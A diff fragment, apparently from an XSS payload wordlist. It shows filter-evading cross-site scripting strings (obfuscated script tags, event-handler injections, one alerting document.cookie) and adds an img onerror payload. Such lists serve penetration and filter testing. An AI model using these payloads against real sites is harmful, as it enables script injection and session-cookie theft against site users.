@@ -182,3 +182,4 @@ javascript​:alert’1’
 <​ScRipT 5-0*3+9/3=>prompt(1)<​/ScRipT giveanswerhere=?
 '><<html onpointerover​=alert(document.cookie) style=display:block>XSS</html>>
 "/><hTML%09OnMoUseOVeR%0a=%0a(confirm)()//
+'"><img src=x onerror​=alert()>
